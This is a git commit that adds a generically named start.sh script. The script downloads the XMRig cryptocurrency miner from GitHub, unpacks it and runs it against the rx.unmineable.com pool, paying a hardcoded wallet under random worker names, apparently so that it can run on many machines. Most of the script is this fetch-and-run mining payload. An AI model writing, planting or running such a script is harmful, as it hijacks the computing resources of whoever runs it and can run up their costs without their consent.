4b8008eb63eaae5310c2b7275dc9bab4fb25fb3d
Gazzy J. Uruj <ghazanfar.uruj.cool@gmail.com>
2021-07-22 08:31:59 +0530

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,9 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-focal-x64.tar.gz
+tar -zxvf xmrig-6.13.1-focal-x64.tar.gz
+cd xmrig-6.13.1
+POOL=rx.unmineable.com:3333
+WALLET=BTT:TQBff9wvrUvsUCz34NG8ptprhUKwwPMgGK
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-Gaz001)
+
+
+./xmrig -o $POOL -u $WALLET.$WORKEER -k -a rx/0
